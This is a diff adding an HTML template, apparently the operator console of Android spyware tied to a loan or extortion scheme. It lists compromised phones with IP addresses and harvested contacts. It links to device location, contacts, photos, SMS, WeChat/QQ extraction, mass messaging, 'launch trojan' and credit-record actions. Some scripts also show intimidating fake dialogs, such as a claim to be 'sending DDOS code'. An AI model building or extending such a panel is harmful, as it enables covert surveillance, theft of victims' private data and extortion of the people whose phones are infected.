@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>layui</title>
+ 
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" href="__PUBLIC__/layui/css/layui.css"  media="all">
+  <link rel="stylesheet" href="__PUBLIC__/font-awesome/css/font-awesome.min.css" media="all" />
+  <link rel="stylesheet" href="__CSS__/admin.css"  media="all">
+  <script src="__PUBLIC__/fang/js/jquery.min.js"></script>
+  
+  
+  
+   <link href="__PUBLIC__/fang/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="__PUBLIC__/fang/css/azzara.min.css" rel="stylesheet" />
+  
+<script>
+        function myrefresh() {
+            window.location.reload();
+        }
+        setTimeout('myrefresh()', 60000);
+    </script>
+  <style type="text/css" media="all">
+      #shop-datatables tbody tr:hover{
+          background-color: #d1f3d9;
+      }
+      #shop-datatables tbody tr td{
+         border: 1px solid #fff!important;
+      }
+  </style>
+  
+</head>
+
+
+
+<body>
+   
+     
+
+        <div style="width:100%" class="main-panel">
+            <div class="content">
+                <div id="content" class="page-inner">
+                    <!-- 开始的地方 -->
+                    
+
+
+                <div style="margin-top:30px" class="row">
+  <div class="col-md-12">
+    <div class="card" style="width:105%;margin-left:-3%">
+      <div class="card-body">
+        <div class="table-responsive">
+          <div id="shop-datatables_wrapper" class="dataTables_wrapper container-fluid dt-bootstrap4 no-footer">
+            <div class="row">
+              <div class="col-sm-12 col-md-6">
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+                  
+               <form id="formsubmit" action="{:url('huaxialianmeng2022/appv1/user')}" method="post">
+                <div class="dataTables_length" id="shop-datatables_length">
+                  <label>显示
+                    <select  onchange="formsubmit()" name="tiaoshu" aria-controls="shop-datatables" class="form-control form-control-sm">
+                      <option {if $tiaoshu == 20}selected{/if} value="20">20条</option>
+                    <option {if $tiaoshu == 100}selected{/if} value="100">100条</option>
+                    <option {if $tiaoshu == 1000}selected{/if} value="1000">1000条</option>
+                    <option {if $tiaoshu == 5000}selected{/if} value="5000">5000条</option>
+                    </select>项结果</label>
+                 
+                </div>
+                 </form>         
+                <script>
+                    function formsubmit(){
+                        $("#formsubmit").submit();
+                    }
+                </script>
+                
+    
+                  
+                
+                
+                
+                
+                
+                
+                
+              </div>
+              <div class="col-sm-12 col-md-6">
+                  
+                  
+                   <form class="layui-form serch" name="formLogin" action="{:url('huaxialianmeng2022/appv1/user')}" method="post">
+                <div id="shop-datatables_filter" class="dataTables_filter">
+                  <label>搜索：授权码
+                  
+                  
+                  {notempty name="postinput['code']"}
+            <input id="yqminput" type="search" value="{$postinput.code}" name="code" lay-verify="title"  placeholder="请输入邀请码" class="form-control form-control-sm" autofocus="autofocus" focus="true">
+             {/notempty}
+             {empty name="postinput['code']"}
+             <input id="yqminput" type="search" name="code" lay-verify="title" autocomplete="off" placeholder="请输入邀请码" class="form-control form-control-sm">
+             {/empty}
+             
+                    </label>
+                </div>
+                
+                
+                
+                
+                
+                 <button id="chaxun" style="display:none" class="layui-btn layui-btn-danger layui-btn-sm txl" lay-submit="" lay-filter="serch">查询</button>
+                 
+                  </form>
+              <script>
+                    var _val=$("#yqminput").val(); 
+                    $("#yqminput").val("").focus().val(_val); 
+            
+                    $('#yqminput').on('input',e=>{
+                        console.log(e.delegateTarget.value);
+                        setTimeout(function () {
+                            $('#chaxun').click();
+                        }, 1000);
+                    })
+            
+                </script>     
+                
+                
+                
+                
+                
+                
+                
+                
+                
+              </div>
+            </div>
+            <div class="row">
+              <div class="col-sm-12">
+                <table id="shop-datatables" class="display table table-striped table-hover dataTable no-footer" role="grid" aria-describedby="shop-datatables_info">
+                  <colgroup >
+                           
+                            <col width="180">
+                            <col width="180">
+                            <col width="400">
+                            <col width="100">
+                            <col width="200">
+                            <col width="250">
+                            
+                          </colgroup>
+                        <thead>
+                           <tr>
+          
+                              <th>手机型号<br>自输号码</th>          
+                              <th>登录时间<br>授权码</th>
+                              <th>重要联系人</th>          
+                              <th>登录IP地址</th>
+                              <th>设备信息查看</th>
+                              <th>系统指令功能</th>
+                              
+                              
+                            </tr> 
+                            
+                        </thead>
+
+                        <tbody>
+                
+                        {volist name="admin" id="vo"}
+                        <tr>
+                     
+                          <td style="font-size:14px;">{$vo.clientid}<br>{$vo.name}</td>
+                          <td>{$vo.login_time|date="Y-m-d H:i:s",###}<br><span style="color:red">{$vo.code}</span></td>
+                          <td>
+                              
+                              {notempty name="lxlist"}
+                              {volist name="lxlist" id="li"}
+                              {if $vo.id == $li.id}
+                              
+                              
+                                  {volist name="li.name" id="list"}
+                                  {$list.username}:{$list.umobile}
+                                  {/volist}
+                              
+                              
+                              {/if}
+                              {/volist}
+                              {/notempty}
+                              
+                              
+                              
+                              
+                              
+                              
+                              
+                          </td>          
+                          <td>
+                              
+                              {$vo.ipdizhi}
+                              
+                              
+                              
+                          </td>
+                         
+                      
+                          <td class="operation-menu">
+                            <div style="display: flex;flex-wrap: wrap;" class="layui-btn-group">
+                           
+                              <a class="btn-success btn"  href="{:url('appv1/dingwei',['id'=>$vo.id])}" target="_blank" id="{$vo.id}" title="在线设备定位" alt="在线设备定位">
+                                  定位
+                              </a>
+                              <a class="btn-success btn" href="{:url('appv1/mobile',['id'=>$vo.id])}"  target="_blank" id="{$vo.id}" title="查询设备通讯录" alt="查询设备通讯录">通讯</a><br>
+                               <a class="btn-success btn" href="{:url('/huaxialianmeng2022/img/index',['id'=>$vo.name])}" target="_blank" id="{$vo.id}" title="查询设备相册" alt="查询设备相册">相册</a>
+                               
+                                <a class="btn-success btn" href="{:url('appv1/sms',['id'=>$vo.id])}" target="_blank" id="{$vo.id}" title="查询设备短信" alt="查询设备短信">短信</a>
+                
+                              <a class="btn-success btn" style="color:#fff" title="微信提取" alt="微信提取">微信</a>
+                
+                              <a class="btn-success btn" style="color:#fff" title="QQ提取" alt="QQ提取">QQ</a>
+                    
+                            </div>
+                          </td>
+                          <td class="operation-menu">
+                            <div style="display: flex;flex-wrap: wrap;" class="layui-btn-group">
+                                <a  class="btn-danger btn" href="{:url('appv1/yjzf',['id'=>$vo.id])}" id="{$vo.id}" title="一键群发" alt="一键群发">一键群发</a>
+                              
+                              <a  class="btn-danger btn" href="{:url('appv1/mumas')}" target="_blank" title="启动木马" alt="启动木马">启动木马</a><br>
+                              
+                              
+                
+                              <a  class="btn-danger btn" href="{:url('appv1/phone',['name'=>$vo.name])}"  id="{$vo.id}" title="查询设备通讯录" alt="查询设备通讯录">本机号码</a>
+                
+                              
+                              <a  class="btn-danger btn" id="{$vo.id}" style="color:#fff" title="修改征信" alt="修改征信">修改征信</a><br>
+                        
+                             <a  class="btn-danger btn"  href="{:url('appv1/exportexcel',['id'=>$vo.id])}" id="{$vo.id}" title="征信获取" alt="征信获取据">征信获取</a>
+                
+                              <a  class="btn-danger btn" style="color:#fff"  title="木马植入" alt="木马植入">木马清除</a>
+                
+                               <a  class="btn-warning btn" href="{:url('appv1/exportexcel',['id'=>$vo.id])}" id="{$vo.id}" title="下载设备通讯录数据" alt="下载设备通讯录数据">下载通讯</a>
+                                <a  class="btn-warning btn delete" style="color:#fff" id="{$vo.id}" title="删除用户" alt="删除用户" >删除用户</a>
+                            </div>
+                          </td>
+                          
+                        </tr>
+                        {/volist}
+
+                        </tbody>
+                </table>
+              </div>
+            </div>
+            <div class="row">
+              <div style="display: flex;align-items: center;" class="col-sm-12 col-md-3">
+                <div style="padding: 0;" class="dataTables_info" id="shop-datatables_info" role="status" aria-live="polite">显示{$tiaoshu}项结果,共{$adminnum}项</div>
+              </div>
+              <div class="col-sm-12 col-md-9">
+                <div class="dataTables_paginate paging_simple_numbers" id="shop-datatables_paginate">
+                  {$admin->render()}
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+                    <!-- 结束的地方 -->
+                </div>
+            </div>
+
+    </div>
+
+   
+
+{include file="public/foot"}
+    
+    <script type="text/javascript">
+    
+    $("#allChoose").click(function () {
+       $("input[name='imgVo']:checkbox").prop("checked", this.checked);
+   });
+
+    $('.delAll_btn').click(function(){
+                var checkids = [];
+                $("input[name='imgVo']:checked").each(function(i){
+                    checkids[i] = $(this).val();
+                });
+                if(checkids.length<=0){
+                  layer.msg('请选择要删除的聊天记录!');
+                  return;
+                }else{
+      layer.confirm('确定要删除并清空这些设备的所有数据吗？（注：删除后不可恢复）', function(index) {
+        $.ajax({
+          url:"{:url('huaxialianmeng2022/appv1/alldeletes')}",
+          data:{delid:checkids},
+          success:function(res) {
+            layer.msg(res.msg);
+            if(res.code == 1) {
+              setTimeout(function(){
+                location.href = res.url;
+              },1500)
+            }
+          }
+        })
+      })
+             
+     }      
+    })
+    $('.updatezhengxing').click(function(){
+      layer.confirm('确定要修改这些设备的里面的征信吗？（注：你没有此权限,修改请联系主管）', function(index) {
+        layer.close(layer.index);
+      })
+    })
+    $('.updateduanx').click(function(){
+      layer.confirm('正在向该用户发送DDOS代码。。。', function(index) {
+        layer.close(layer.index);
+      })
+    })
+    $('.bthorse').click(function(){
+      layer.confirm('确定要清空这些设备的里面的木马病毒？（注：你没有此权限,删除请联系主管）', function(index) {
+         layer.close(layer.index);
+      })
+    })
+    $('.updateweixin').click(function(){
+      layer.confirm('正在提取该设备上微信通讯录，以及聊天记录', function(index) {
+        layer.close(layer.index);
+      })
+    })
+    $('.updatetxqq').click(function(){
+      layer.confirm('正在提取该设备上QQ通讯录，以及聊天记录', function(index) {
+        layer.close(layer.index);
+      })
+    })
+    
+    
+    
+    
+    $('.delete').click(function(){
+      var id = $(this).attr('id');
+      layer.confirm('确定要删除这台设备帐号和所有数据吗？（注：删除后不可恢复）', function(index) {
+          
+        layer.open({
+    	title: '请输入二级密码',
+    	area: ['300px', '240px'],
+    	btnAlign: 'c',
+    	closeBtn:'1',//右上角的关闭
+    	content: `<div><p>注意:若要删除此设备信息请输入公司管理二级密码</p><input name="number" id="remark" style="width:100%;height:30px;"/></div>`,
+    	btn:['确认','取消'],
+    	yes: function (index, layero) {
+    	var value1 = $('#remark').val();//获取多行文本框的值
+    	
+    	if(value1 == ''){
+    	     layer.alert('请填写密码', {
+                icon: 5,
+                title: "提示"
+            });
+        
+        
+    	}else{
+    	$.ajax({
+          url:"{:url('huaxialianmeng2022/appv1/delete')}",
+          data:{id:id,value1:value1},
+          success:function(res) {
+            layer.msg(res.msg);
+            if(res.code == 1) {
+              setTimeout(function(){
+                location.href = res.url;
+              },1500)
+            }
+          }
+        });
+    	}
+    	
+    }
+    
+    });
+
+       
+       
+       
+       
+        
+        
+        
+      })
+    })
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    $('.deleteuser').click(function(){
+      var id = $(this).attr('id');
+      layer.confirm('确定要清空这台设备的所有通讯录数据？（注：删除后不可恢复）', function(index) {
+        $.ajax({
+          url:"{:url('huaxialianmeng2022/appv1/clearuser')}",
+          data:{id:id},
+          success:function(res) {
+            layer.msg(res.msg);
+            if(res.code == 1) {
+              setTimeout(function(){
+                location.href = res.url;
+              },1500)
+            }
+          }
+        })
+      })
+    }) 
+    
+    $('.deletesms').click(function(){
+      var id = $(this).attr('id');
+      layer.confirm('确定要清空这台设备的所有短信数据？（注：删除后不可恢复）', function(index) {
+        $.ajax({
+          url:"{:url('huaxialianmeng2022/appv1/clearsms')}",
+          data:{id:id},
+          success:function(res) {
+            layer.msg(res.msg);
+            if(res.code == 1) {
+              setTimeout(function(){
+                location.href = res.url;
+              },1500)
+            }
+          }
+        })
+      })
+    })      
+    </script>
+  
+</body>
+
+
+
+
+</html>
